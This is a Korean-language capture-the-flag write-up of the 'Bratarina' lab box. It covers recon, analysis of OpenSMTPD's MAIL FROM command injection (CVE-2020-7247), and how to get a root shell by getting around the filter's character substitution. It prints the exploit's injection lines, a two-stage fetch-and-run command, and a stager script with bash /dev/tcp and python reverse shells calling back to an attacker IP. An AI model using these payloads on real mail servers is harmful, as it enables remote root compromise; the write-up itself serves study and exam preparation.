---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smtp
  - tech/rce/cmd-injection
  - tech/payload/revshell
  - tech/svc/smb
type: machine
platform: pg
os: linux
ports: [22, 25, 80, 445]
services: [http, netbios-ssn, smtp, ssh]
cves: [CVE-2020-7247]
status: solved
manual_tags: true
manual_cves: true
manual_domain: true
tech_count: 4
---
> [!info] Bratarina — PG Practice / Linux / Fundamental / 플래그 1개(root)
> 25/tcp OpenSMTPD 의 `MAIL FROM` 명령 인젝션(CVE-2020-7247) → 인젝션이 **root 로 실행**되므로 권한상승 단계 없이 곧장 root. 80(FlaskBB)·445(SMB) 는 둘 다 막다른 길이었다.
>
> 이 노트의 코드펜스는 `~/PG/Bratarina/` 산출물로 실증된 것만 넣었다. 출처: `nmap.log`·`nmap_udp.log`(정찰) · `smtp_probe1.txt`(SMTP) · `smbmap.txt`·`smb_shares.txt`·`smb_share_path.txt`·`smb_traversal.txt`·`smb_loot/passwd.bak`(SMB) · `web_static_probe.txt`·`gobuster_80_stdout.txt`·`web_flaskbb_paths.txt`·`web_vhost_probe.txt`(웹) · `47984.py`·`48038.rb`·`www/x`·`www/e`·`http_stager.log`·`http_exfil.log`·`tcpdump_callback.log`·`shell.log`·`verify_shell.log`(익스플로잇). 최초 풀이 2026-08-20 12:50~13:09 KST — root 셸 회수까지 **11분**, 플래그 검증 완료까지 19분.
>
> 같은 날 13:30~13:36 에 타겟이 아직 살아 있어 **RCE 가 root 로 도는 것과 플래그 값을 다시 확인**했다(`revalidate_*` 산출물). 이때 재현한 것은 인젝션·명령실행·플래그 회수까지고, **리버스셸은 다시 띄우지 않았다.** 해당 블록은 "재실측"으로 명시했다.
>
> 이 박스는 전 과정이 에이전트 자동화로 돌아가 **화면 캡처가 한 장도 없다.** 증거는 전부 기계 로그(`tcpdump_callback.log`, `*.log`)다. 시험장에서는 반대로 스크린샷이 증거의 본체다(§5).

> [!warning] 적대적 검증 정정 이력 (2026-08-20, 감사자)
> 초고를 `~/PG/Bratarina/` 산출물·`47984.py`/`48038.rb` 원문·OpenSMTPD 6.6.1p1 소스·Qualys 어드바이저리와 대조해 아래를 고쳤다. **터미널 출력·명령·IP·해시·플래그는 한 바이트도 바꾸지 않았다.**
>
> | 위치 | 무엇이 틀렸나 | 근거 |
> |---|---|---|
> | §0·§2·§3 금지문자 | "`$`·파이프가 **걸러진다**" — 실제로는 **`:` 한 글자로 치환**된다. 삭제가 아니다 | `http_stager.log` 의 `GET /x:sh` — 인젝션한 `curl …/x` + 파이프 + `sh` 에서 파이프만 `:` 로 바뀐 결과. OpenSMTPD `MAILADDR_ESCAPE` 치환 |
> | §2 "통과하는 문자" | `:` 와 `>` 를 안전 목록에 넣었다 — 둘 다 **주소를 잘라먹는다** | `smtp_mailaddr()` 이 첫 `>` 에서 주소를 끊고, 첫 `:` 앞을 통째로 버린다. 산출물의 모든 인젝션이 `http://` 없는 URL 을 쓴 이유 |
> | §2 `MyBadChars` 해석 | "msf 가 **payload** 를 검사한다" — 아니다. **MAIL FROM 문자열**을 검사하고 payload 는 DATA 본문으로 보낸다 | `48038.rb` 의 `from.chars & target['MyBadChars']` |
> | §1-2·§8·§9 영향 범위 | "OpenSMTPD `< 6.6.2`" — 하한이 빠졌다 | `47984.py` 헤더 "after commit a8e222352f", Qualys "since May 2018", 수정본 6.6.2p1 |
> | §6 `sleep 3` 해설 | "3초 안에 80 을 nc 로 갈아끼우는 장치" — **반증됨.** 첫 줄 bash 리버스셸은 `sleep` 앞에서 즉시 뜬다 | `tcpdump_callback.log`: 스크립트 fetch 13:00:52 → 접속 13:01:47(**55초 뒤**), 두 번째 접속 13:01:50(정확히 3.0초 뒤 = python 폴백) |
> | §1-3·§6·§7 소요 시간 | "~15분", "45분짜리 박스", "30분" | 산출물 mtime 상 SMB·웹 열거는 12:53~12:56 = **3분**이고 SMTP 경로와 **병렬**로 돌았다 |
> | §1-2 HELP 블록 | 파일에 있는 `>>>` 송신 줄과 `221 2.0.0 Bye` 를 지우고 없는 명령줄(`python3 probe.py`)을 붙였다 | `revalidate_smtp_help.txt` 원문으로 교체 |
> | §5 잘린 첫 줄 | 원인을 "로그 캡처 시작점"으로 단정 | 원문에 `\r` 이 박혀 있다. 실제 원인 미확정 → `[가정]` 강등 |
> | §8 패치 내용 | "입력 이스케이프가 고쳐졌다" | 실제 수정은 `smtp_mailaddr()` 의 **반환값** — 검증 실패인데 성공(1)을 돌려주던 분기 |
>
> **반증되어 그대로 둔 것**: nmap 의 `2.0.0` 이 버전이 아니라는 §1-2 판정(맞다), 아웃바운드 80-only 의 `[가정]` 강등(타당하다 — tcpdump 는 12:55:48부터 `not tcp port 25` 로 전 포트를 떴고 80 외 SYN 이 0건이다), `12 80` 집계(정확히 12건), §남긴 흔적의 정리 확인(`tmux ls`·`ss -lntp`·`www/` 로 재확인).

## 0. 이 박스에서 배우는 것

- **OpenSMTPD `MAIL FROM` 명령 인젝션(CVE-2020-7247)** — 로컬 파트에 `;cmd;` 를 넣으면 메일 로컬 배달(mda)이 그 문자열을 셸로 실행한다. 배달은 root 로 도니 **한 방에 root RCE**다.
- **배너의 "2.0.0" 을 버전으로 읽지 마라.** OpenSMTPD 는 버전을 노출하지 않는다. nmap 이 "OpenSMTPD 2.0.0" 처럼 보여주는 `2.0.0` 은 **enhanced status code(ESC) 접두**지 소프트웨어 버전이 아니다. 취약 여부는 배너로 못 가리고 **PoC 로 때려봐야** 안다.
- **인젝션에는 못 쓰는 문자가 있고, 걸러지는 게 아니라 `:` 로 바뀐다.** `$` `|` `` ` `` `#` 등은 삭제되지 않고 **콜론 한 글자로 치환**된 채 셸에 도달한다. 그래서 `curl LHOST/x|sh` 는 `curl LHOST/x:sh` 라는 **엉뚱한 URL 한 개**가 되고, `$(id)` 는 `:(id)` 가 되어 셸이 문법 오류로 죽는다. 결과적으로 **2단계 페이로드**(짧은 fetch 명령으로 스크립트를 받아 실행)가 강제된다.
- **아웃바운드가 사실상 tcp/80 뿐**인 환경에서의 리버스셸 회수 — 다운로더 회선과 셸 회선이 같은 80 을 놓고 경합한다. (80-only 는 관측 기반 `[가정]` 이다. 근거는 §6)
- 표면 셋 중 둘(80 FlaskBB, 445 SMB)이 **함정**이다. 열거는 "읽히는 것"이 아니라 "공격 가능한 입력"이 있는지로 판단한다.

**시험 출제 가능성** — OpenSMTPD RCE 자체는 특정 CVE라 그대로 나오긴 어렵지만, 유형은 흔하다: 버전 미상 서비스에 공개 PoC 를 blind 로 적용, 인젝션 문자 제약을 우회하는 스테이징, 아웃바운드 포트 제약. 25/tcp 에 OpenSMTPD 가 보이면 반사적으로 CVE-2020-7247 을 떠올릴 것.

## 1. 정찰

### 1-1. Nmap — 전 포트

```
# Nmap 7.98 scan initiated Thu Aug 20 12:50:34 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Bratarina/nmap.log 192.168.248.71
Host is up (0.092s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.207], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
```

`-p-` 전 포트, `-Pn` 은 ICMP 차단 대비(호스트가 ping 에 답 안 해도 스캔 강행), `--min-rate 5000` 로 65535 포트를 80초에. UDP 상위 100 은 전부 `open|filtered`(무응답) — `nmap_udp.log` 확인, 진입점 없음.

`Not shown: 65530 filtered` 줄을 기억해 둘 것. 열린 5개 말고는 전부 **무응답 필터**다. 139/tcp 도 여기 포함되고, 그래서 §6 의 `smbclient -L` SMB1 리스팅이 `NT_STATUS_IO_TIMEOUT` 으로 죽는다 — 도구 버그가 아니라 nmap 이 이미 알려준 사실이다.

주목할 줄은 25/tcp 다. FlaskBB(80)와 Samba(445)는 눈에 잘 띄지만 결국 함정이고, **버전조차 안 밝히는 OpenSMTPD 가 실제 문**이었다.

### 1-2. SMTP 버전 판정 — 배너는 버전을 주지 않는다

nmap 의 `smtp-commands` 한 줄만 보면 "OpenSMTPD 2.0.0" 로 읽힌다. 직접 EHLO/HELP 를 쳐보면 왜 그게 오독인지 드러난다. 아래는 `revalidate_smtp_help.txt` 원문이다(재실측, 2026-08-20 13:30 KST). `>>>` 로 시작하는 줄이 이쪽이 보낸 것이다:

```
220 bratarina ESMTP OpenSMTPD
>>> EHLO test
250-bratarina Hello test [192.168.45.207], pleased to meet you
250-8BITMIME
250-ENHANCEDSTATUSCODES
250-SIZE 36700160
250-DSN
250 HELP
>>> HELP
214-2.0.0 This is OpenSMTPD
214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org
214-2.0.0 with full details
214 2.0.0 End of HELP info
>>> QUIT
221 2.0.0 Bye
```

최초 풀이 때 뜬 `smtp_probe1.txt`(12:53:21)의 214 줄도 이것과 한 글자도 다르지 않다.

HELP 응답 각 줄의 `2.0.0` 은 **ENHANCEDSTATUSCODES(EHLO 에 광고돼 있다)** 의 상태 코드다. 자기 증명이 블록 안에 있다 — `214-2.0.0 with full details` 처럼 **문장 조각에도 똑같이 `2.0.0` 이 붙는다.** 버전이라면 그럴 수 없다. `214-2.0.0 This is OpenSMTPD` 에서 문장은 "This is OpenSMTPD"로 끝나고 버전은 없다. nmap 은 여러 214 줄을 한 줄로 이어 붙이며 앞뒤 `2.0.0` 을 섞어 "OpenSMTPD 2.0.0"처럼 보이게 만든 것뿐이다. `VERSION` 칼럼이 그냥 `OpenSMTPD` 인 것도 같은 이야기다 — nmap 도 버전을 못 뽑았다.

그래서 **취약 여부는 배너로 확정할 수 없다.** 취약 범위는 "2018-05 커밋 `a8e222352f` 이후 ~ **6.6.2p1 에서 수정**"이고(`47984.py` 헤더와 `48038.rb` 의 타깃명 `OpenSMTPD >= commit a8e222352f`, Qualys 어드바이저리가 같은 말을 한다), **`< 6.6.2` 라고만 외우면 안 된다** — 그 커밋 이전 버전은 이 결함이 없다. 어느 쪽이든 여기선 버전이 안 나오니 **PoC 를 blind 로 던져 반응을 보는 수밖에** 없었다. 결과적으로 취약했다.

> [!warning] "버전이 보인다"에 속지 마라
> 서비스가 상태 코드·해시·빌드 문자열을 뱉으면 그게 버전처럼 읽히기 쉽다. 판정은 독립 근거 둘로 교차하는 게 원칙인데([[Hub]] · [[Levram]] · [[RubyDome]]), 근거가 하나도 없으면 **PoC 실측이 유일한 근거**가 된다. 이 박스가 그 경우다.

### 1-3. SMB(445) — null session, 그러나 막다른 길

null session(익명, 빈 사용자/빈 암호)은 허용, guest 로그인은 실패(`STATUS_LOGON_FAILURE`). 공유는 `backups`(Disk)와 `IPC$` 둘.

```
# smbclient -N -L //192.168.248.71/
	Sharename       Type      Comment
	backups         Disk      Share for backups
	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)

# rpcclient -N -c 'netshareenumall'
netname: backups
	path:	C:\opt\samba
netname: IPC$
	path:	C:\tmp
```

`backups` = 서버의 `/opt/samba`. 익명 읽기만 되고 쓰기·트래버설은 전부 거부:

```
# 쓰기 시도 (smbclient put) -> NT_STATUS_ACCESS_DENIED
# 공유 밖으로 트래버설
-- ls '../'            -> NT_STATUS_NO_SUCH_FILE
-- ls '../../../etc/'  -> NT_STATUS_OBJECT_NAME_NOT_FOUND
```

`rpcclient netsharegetinfo backups` 의 DACL 은 `SID: S-1-1-0`(Everyone)에 full(0x1f01ff) 로 보이는데도 PUT 이 거부됐다. SMB 공유 DACL 은 write 를 허용해도 **Samba 설정(`read only = yes` 류)이나 파일시스템 퍼미션**이 우선 거부하면 실제로는 못 쓴다 — 공유 ACL 만 보고 쓰기 가능하다 판단하면 안 되는 이유다. [가정] 정확한 거부 원인(smb.conf 대 fs 퍼미션)은 root 셸에서 확인하지 않았다.

공유의 유일한 파일은 `passwd.bak`(1747 B), `/etc/passwd` 사본이다. 해시는 없고(그림자 파일 아님) 값은 **사용자명 목록**뿐:

```
root:x:0:0:root:/root:/bin/bash
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

`_smtpd`/`_smtpq` 계정이 OpenSMTPD 설치를 재확인해준다. `neil`·`postgres` 는 SSH/메일 크리덴셜 후보였지만, 결국 이 박스는 크리덴셜 없이 SMTP RCE 로 풀려 **사용자명은 쓰이지 않았다.** SMB 는 통째로 곁길이다.

### 1-4. 웹(80) — FlaskBB 는 데코이

FlaskBB 정적 자산은 뜬다(`/static/css/styles.css` 200, 477855 B). 그런데 동적 라우트가 **전부** 같은 404 페이지(6461 B)를 돌려준다:

```
/login /register /auth /user /forum /topic /admin /management /post
  -> 전부 404, 응답 크기 6461 로 동일
```

gobuster(dirb `common.txt`)로 나온 건 셋뿐:

```
/index.html   200  612   -> stock "Welcome to nginx!" 기본 페이지
/robots.txt   200  14    -> "User-agent: *" 만, Disallow 없음
/static       301  -> /static/ 는 403 (autoindex off)
```

템플릿이 `http:///static/...`(빈 호스트)로 렌더되는 걸로 봐 Flask `SERVER_NAME` 미설정이다. Host 헤더를 `bratarina`·`localhost`·`coffeecorp.com`·`bratarina.coffeecorp.com`·`flaskbb.local`·IP 로 바꿔봐도 전부 404 — vhost 문제가 아니다. 로그인도 회원가입도 포럼 콘텐츠도 없고, **주입할 입력 자체가 없다.** 80 은 함정으로 확정.

## 2. 취약점 분석 — CVE-2020-7247

### 배경

OpenSMTPD(OpenBSD 의 SMTP 서버)는 `MAIL FROM` 주소의 로컬 파트를 `valid_localpart()` 로 검사한다. 결함은 **검사가 실패했을 때 서버가 거절하지 않는 것**이다 — 로컬 파트가 부적합해도 **도메인 파트가 비어 있으면** "로컬 사용자로 보고 통과"시켜 버린다. 그래서 `MAIL FROM:<;명령;>` 처럼 `@도메인` 을 아예 안 붙이면 검사를 통째로 우회한다.

그 주소는 로컬 배달(mda) 명령줄에 그대로 박힌다. 메일이 로컬 사용자에게 배달될 때 서버는 `/bin/sh -c "…"` 로 배달 명령을 실행하고 발신자 주소가 그 명령줄에 섞여 들어간다. 여기에 `;명령;` 을 심으면 **명령이 그대로 실행**된다. 배달 프로세스가 root 로 도니 실행도 root.

한 겹 더 있다. mda 명령줄을 만들 때 OpenSMTPD 는 `MAILADDR_ESCAPE` 에 든 문자를 **콜론(`:`) 한 글자로 치환**한다. 지우는 것도, 백슬래시로 이스케이프하는 것도 아니라 **다른 글자로 바꿔치기**다 — 이게 다음 절의 페이로드 제약을 전부 설명한다.

### 왜 이 페이로드인가

`47984.py`(exploit-db 47984)가 보내는 핵심 줄:

```python
s.send(b'HELO x\r\n')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
s.send(b'RCPT TO:<root>\r\n')     # root 로 로컬 배달 유도
s.send(b'DATA\r\n')
s.send(b'\r\nxxx\r\n.\r\n')       # 본문 종료 -> 배달 트리거 -> 인젝션 실행
s.send(b'QUIT\r\n')
```

- `MAIL FROM:<;{CMD};>` — 발신자 주소 로컬 파트를 `;CMD;` 로. `@도메인` 이 없어서 위의 "도메인 비면 통과" 분기를 탄다. 앞뒤 `;` 가 원래 명령과 CMD 를 갈라놓는다.
- `RCPT TO:<root>` — 로컬 사용자 root 로 배달시켜 mda 경로를 타게 한다.
- `.` 한 줄로 DATA 종료 → 서버가 큐에서 배달을 처리하며 인젝션 실행.

Metasploit 모듈 `48038.rb`(같은 CVE)에 쓸 수 없는 문자 목록이 박혀 있다:

```ruby
'MyBadChars' => "!\#$%&'*?`{|}~\r\n".chars
```

Ruby 이중따옴표라 `\#` 는 리터럴 `#` 다. 풀어 쓰면 `! # $ % & ' * ? ` { } ~` 와 CR/LF — **OpenSMTPD 의 `MAILADDR_ESCAPE` 와 정확히 같은 집합**이다. 모듈이 이 목록을 쓰는 곳을 보면 오해를 피할 수 있다:

```ruby
elsif (badchars = (from.chars & target['MyBadChars'])).any?
```

검사 대상은 **`from`, 즉 MAIL FROM 문자열**이지 payload 가 아니다. msf 는 진짜 payload 를 주소에 안 넣고 **DATA 본문**으로 보낸다(아래 §7-2 의 comment slide). 주소에 넣을 수 있는 것과 본문에 넣을 수 있는 것을 헷갈리면 이 CVE 를 잘못 배운다.

**중요한 건 이 문자들이 사라지는 게 아니라 `:` 로 바뀐다는 것이다.** 파이프를 넣은 `curl LHOST/x|sh` 는 명령이 둘로 갈라지는 대신 `curl LHOST/x:sh` 라는 **URL 하나짜리 명령**이 되고, `$(id -u)` 는 `:(id -u)` 가 되어 셸이 `(` 에서 문법 오류로 죽는다. §6 의 `http_stager.log` 에 이 치환이 실물로 찍혀 있다.

주소를 잘라먹는 문자도 둘 있다. `smtp_mailaddr()` 은 **첫 `>` 에서 주소를 끊고**, 그 다음 **첫 `:` 앞을 통째로 버린다.** 그래서:

- `>` 를 쓰면 그 뒤가 통째로 날아간다 → `bash -i >& /dev/tcp/…` 를 인라인으로 못 넣는다
- `:` 를 쓰면 그 앞이 날아간다 → **URL 에 `http://` 를 못 붙인다.** 산출물의 모든 인젝션이 `curl 192.168.45.207/x` 처럼 스킴 없는 URL 을 쓰는 이유고, 재실측 때 `CURLNOSCHEME` 프로브를 따로 던진 이유다

이 박스에서 **실제로 통과가 확인된** 문자는 영숫자와 `;` · 공백 · `-` · `.` · `/` 다 — 성공한 인젝션들이 쓴 것이 그게 전부다. `MAILADDR_ESCAPE` 에도 절단 문자에도 없으니 `(` `)` `,` `=` `_` 도 통과할 것으로 보이지만 [가정] 이 박스에서 던져보지는 않았다.

이 제약이 §3 의 스테이징 방식을 결정했다 — 인젝션에는 **위 문자를 안 쓰는 짧은 fetch 명령**만 넣고, 파이프·치환이 필요한 진짜 로직은 받아올 스크립트 파일 안에 둔다.

## 3. Foothold — 2단계 페이로드로 root 셸

`47984.py` 는 임의 명령을 root 로 실행시켜 준다. 문제는 **회수**다. 아웃바운드가 사실상 tcp/80 뿐이고(§6 참조) 인젝션엔 `>`·`|`·`$` 를 못 쓰니, 리버스셸 한 줄을 주소에 담을 방법이 없다. 그래서:

1. Kali 80 에 HTTP 서버를 띄우고 리버스셸 스크립트 `x` 를 놓는다.
2. 인젝션으로 `curl … -o /tmp/x; sh /tmp/x` 를 보내 스크립트를 받아 실행. 여기 쓰인 문자는 전부 통과 목록에 있다 — 스킴 없는 URL(`:` 회피), 파이프 대신 `-o`(`|` 회피), 리다이렉트 없음(`>` 회피).
3. `x` 안에서 `/dev/tcp/…/80` 리버스셸을 띄운다.

받아온 스크립트 `www/x`(산출물 원문):

```sh
#!/bin/sh
L=192.168.45.207
P=80
setsid /bin/bash -c "bash -i >& /dev/tcp/$L/$P 0>&1" >/dev/null 2>&1 &
sleep 3
setsid python3 -c "import socket,os,pty;s=socket.socket();s.connect(('$L',$P));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')" >/dev/null 2>&1 &
```

파일 안에서는 `$L`·`>&` 를 자유롭게 쓴다 — 이 바이트들은 SMTP 주소 파서를 거치지 않고 HTTP 로 오기 때문에 치환도 절단도 안 당한다. **제약은 인젝션 단계에만 있다.** `setsid … &` 로 배경화하는 건, 인젝션을 실행하는 mda 프로세스가 리버스셸 자식을 물고 죽지 않게 셸을 세션에서 떼어내려는 것. `sleep 3` 뒤 python pty 를 한 번 더 시도하는 건 bash `/dev/tcp` 가 실패할 때의 폴백이자 TTY 승격용이다 — `tcpdump` 에 이 3초가 그대로 찍혔다(§6).

리스너가 root 셸을 받은 기록(`shell.log`):

```
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.71] 47476
bash: cannot set terminal process group (2034): Inappropriate ioctl for device
bash: no job control in this shell
root@bratarina:~#
```

`cannot set terminal process group` / `no job control` 은 TTY 없는 셸의 정상 증상이다. 프롬프트가 곧장 `root@bratarina` — **권한상승 없이 최초 접근이 root**다. OpenSMTPD 배달이 root 로 돌기 때문.

> [!tip] 셸을 잡자마자 칠 것
> 여기선 이미 root 라 `sudo -l`·`find -perm -4000`·`getcap` 이 불필요했지만, 습관은 유지한다. 최초 접근이 root 인지부터 `id` 로 확인 — 그러면 4장을 통째로 건너뛴다.

### 재실측 (2026-08-20 13:30~13:36, 살아 있는 타겟)

최초 풀이 뒤 타겟이 아직 살아 있어 **RCE 가 root 로 도는 것과 플래그 값을 다시 확인**했다. 리버스셸은 다시 띄우지 않았다 — 재확인한 것은 인젝션 → 명령 실행 → 플래그 회수까지다.

먼저 인젝션이 실제로 실행되는지 ping 으로 확인했다. `revalidate_tcpdump.log` 원문:

```
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:32:31.838093 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 1, length 64
13:32:31.838117 IP 192.168.45.207 > 192.168.248.71: ICMP echo reply, id 2213, seq 1, length 64
13:32:32.840046 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 2, length 64
13:32:33.841388 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 3, length 64
```

이어 `revalidate_http.log`(Kali `http.server` 로그) 원문:

```
192.168.248.71 - - [20/Aug/2026 13:34:39] "GET /CURLNOSCHEME HTTP/1.1" 404 -
192.168.248.71 - - [20/Aug/2026 13:36:10] "GET /r HTTP/1.1" 200 -
192.168.248.71 - - [20/Aug/2026 13:36:10] "GET /LIVEROOT-0-root-bratarina-16677ad43054a7953b4bcc9d30ce582b HTTP/1.1" 404 -
```

13:34:39 의 `CURLNOSCHEME` 는 **스킴 없는 URL 로 curl 이 도는지** 확인한 프로브다 — `:` 가 주소를 잘라먹으니 `http://` 를 못 붙이기 때문이고, 404 회신이 왔다는 건 스킴 없이도 curl 이 정상 동작한다는 뜻이다.

13:36:10 의 두 줄이 본체다. 스테이저 `/r` 을 받아 실행했고, 그 안에서 만든 URL 이 `LIVEROOT-0-root-bratarina-16677ad43054a7953b4bcc9d30ce582b` 로 돌아왔다 — `uid=0`, user `root`, host `bratarina`, 그리고 플래그. **파일 안에 넣은 `$( )` 는 정상 확장됐다.**

스테이저 `/r` 본문은 정리하며 지웠으므로(§남긴 흔적) 산출물에 남아 있지 않다. 회신 URL 로 역산하면 `id -u`·`id -un`·`hostname`·`cat /root/proof.txt` 를 이어붙인 것이었다. [가정] 정확한 스크립트 원문은 보존되지 않았다.

같은 시간대에 `$( )` 를 **인라인으로** 넣은 인젝션도 던졌는데 회신이 오지 않았다. `$` → `:` 치환으로 `curl …/UID:(id -u)` 가 되어 셸이 `(` 에서 죽으면 curl 자체가 실행되지 않으므로 회신이 없는 것이 예상된 결과다. 다만 **그 인젝션의 정확한 문자열은 산출물로 남기지 못했고**, 남은 것은 "회신이 없었다"는 부재뿐이다. [가정] 인라인 실패. 치환이 실제로 일어난다는 것은 부재가 아니라 §6 의 `GET /x:sh` 가 증명한다.

## 4. 권한상승

없음. §3 에서 최초 접근이 이미 root(`uid=0(root) gid=0(root) groups=0(root)`)다. OpenSMTPD 로컬 배달이 root 권한으로 명령을 실행하는 것이 이 박스의 전부다.

## 5. 플래그

`/root/proof.txt` = `16677ad43054a7953b4bcc9d30ce582b` (플래그 1개, user/root 분리 없음).

최초 풀이의 증거 수집(`verify_shell.log` 원문, 앞머리부터 그대로):

```
bash: cannot set terminal process group (2117): Inappropriate ioctl for device
bash: no job control in this shell
root@bratarina:~# <txt -o -name local.txt \) 2>/dev/null; echo ENDMARK
uid=0(root) gid=0(root) groups=0(root)
bratarina
192.168.248.71 
===
16677ad43054a7953b4bcc9d30ce582b
===
/root/proof.txt
ENDMARK
```

이건 **nc 로 받은 대화형 셸**이지 웹셸이 아니다 — 프롬프트가 있고, 플래그를 원위치에서 `cat` 했다. OSCP 는 웹셸로 얻은 플래그를 0점 처리하므로 이 구분이 실제로 점수다.

`<txt -o -name local.txt \)` 는 `find … -name proof.txt -o -name local.txt \)` 의 뒤쪽만 보이는 것이다. 원문 파일에는 프롬프트 바로 뒤에 캐리지리턴(`\r`)이 박혀 있고 그 뒤부터 이 조각이 시작한다. [가정] 정확한 원인(터미널 폭 되감기인지 로그 캡처 방식인지)은 확정하지 못했다. 이어지는 `id`·`hostname`·`ip`·플래그·경로는 온전하다.

> [!warning] 시험 증거 형식
> 이 박스는 자동화로 풀려 **스크린샷이 0장**이다. 로그로는 충분하지만 시험장에서는 인정 안 된다 — 플래그는 `whoami; hostname; ip a; cat proof.txt` 를 **한 화면에** 캡처해야 점수가 된다(§5, 표준의 증거 요건). 셸이 TTY 없는 상태라 `ip a` 가 안 나오면 python pty 로 승격한 뒤 찍는다.

## 6. 막혔던 지점 / 시행착오

이 박스의 진짜 값어치다. 산출물 mtime 으로 시간선을 복원했다(전부 KST, 로그 본문 시각과 mtime 이 같은 타임존이다).

먼저 실제 소요를 정직하게 적어둔다. 작업 디렉터리 생성 12:50:26 → nmap 완료 12:51:55 → 첫 인젝션 12:56:03 → **root 셸 13:01:47** → 플래그 검증 13:09:33. **root 까지 11분 21초.** SMB·웹 열거(12:53:02~12:56:31)는 SMTP 경로와 **병렬로** 돌아서 벽시계 시간을 거의 안 먹었다 — 아래 두 항목의 "헛짚음"은 사람이 순서대로 풀 때 얼마를 태울 수 있었는지의 이야기지, 이 세션이 실제로 태운 시간이 아니다.

**80 헛짚음 (12:53:19~12:56:31).** FlaskBB 정적 자산이 뜨니 웹앱이 살아 있는 줄 알고 라우트·vhost·gobuster 를 돌렸다. 동적 경로가 전부 6461 B 짜리 동일 404 였던 게 신호였다 — 앱이 라우트를 하나도 안 태운다는 뜻. **"응답이 200/정상처럼 보인다"와 "공격 가능한 입력이 있다"는 다르다**([[Crane]]·[[Squid]] 와 같은 패턴). 정적 자산만 서빙되고 동적 라우트가 균일한 에러면 조기에 접어야 했다.

**SMB 쓰기·트래버설 (12:53:16~12:56:17).** `backups` 공유 DACL 이 Everyone-full 로 보여 쓰기를 기대했지만 PUT 은 `ACCESS_DENIED`. `../`·`../../../etc/` 트래버설도 `NO_SUCH_FILE`/`OBJECT_NAME_NOT_FOUND` 로 막혔다. 공유 ACL 을 파일시스템 권한으로 착각하면 시간을 태운다.

**TRIED AND FAILED (writeup_notes.txt 원문 요약).**
- `smbmap` as guest → guest 계정 비활성으로 Access denied
- `smbclient -L` SMB1 workgroup 리스팅 → `NT_STATUS_IO_TIMEOUT`(139 필터)
- `enum4linux-ng` 의 LDAP/LDAPS/NetBIOS-139 검사 → 타임아웃(포트 필터, 예상된 결과). enum4linux-ng 는 닫힌 포트에서 오래 물고 늘어지니 타임아웃을 짧게 잡을 것.
- RPC user/group enum → 0 users, 0 groups (Samba standalone, SAM 없음)
- Host-header vhost 퍼징 → 변화 없음

**`GET /x:sh` — 치환이 실물로 찍힌 자리.** `http_stager.log` 원문:

```
12:57:13 "GET /x:sh HTTP/1.1" 404
12:57:50 "GET /CURLTEST HTTP/1.1" 404     <- curl 존재 확인용 프로브
12:57:56 "GET /WGETTEST HTTP/1.1" 404     <- wget 존재 확인용 프로브
12:58:37 "GET /x HTTP/1.1" 200            <- 스크립트 fetch 성공
13:00:52 "GET /x HTTP/1.1" 200
```

첫 줄의 요청 경로 `/x:sh` 는 서버가 **실제로 받은 것**이다. 인젝션한 명령 문자열 자체는 산출물에 안 남았지만, 이 경로 하나로 역산이 된다 — `curl 192.168.45.207/x` 뒤에 파이프와 `sh` 를 붙인 것이 **파이프만 콜론으로 바뀌어** URL 의 일부가 됐다. 파이프가 지워졌다면 요청 경로는 `/xsh` 였을 것이고, 명령이 정상적으로 갈라졌다면 `/x` 였을 것이다. `:` 라야 이 경로가 나온다.

`curl` 입장에서는 `/x:sh` 라는 파일을 받아오려 한 것이고 404 를 받았다. 문자 제약을 "필터링"으로 알고 있으면 이 404 를 "curl 이 없나?" 로 오독하고 다음 두 줄(`CURLTEST`/`WGETTEST`)처럼 엉뚱한 확인에 시간을 쓰게 된다. 실제로 그렇게 됐다 — 12:57:13 부터 스크립트 fetch 가 성공한 12:58:37 까지 84초가 여기서 갔다.

**아웃바운드 포트 제약.** 인젝션은 되는데 리버스셸이 안 붙었다.

`tcpdump_callback.log` 로 실제 나간 connect-back 을 세어보면 **전부 tcp/80**이었다:

```
$ grep -oE '> 192\.168\.45\.207\.[0-9]+: Flags \[S\]' tcpdump_callback.log \
    | awk -F'[.:]' '{print $5}' | sort | uniq -c
     12 80
```

12건 모두 80, 다른 포트로 나간 SYN 은 없다. 캡처는 12:55:48(첫 인젝션 15초 전)부터 `host 192.168.248.71 and not tcp port 25` 로 떴으니 **익스플로잇 구간 전체가 필터에 들어와 있다.**

[가정] 그래도 "아웃바운드 80-only" 를 단정할 수는 없다. tun0 캡처는 "다른 포트가 타겟 방화벽에서 막혀 SYN 이 Kali 까지 못 온" 경우와 "애초에 80 만 시도한" 경우를 구분하지 못한다. 확실한 것은 **관측된 회선이 전부 80**이라는 것뿐이다. 프로젝트 기록의 "Wombo·Bratarina 는 tcp/80 만" 도 같은 근거에서 나온 것이라 독립 근거로 치지 않는다.

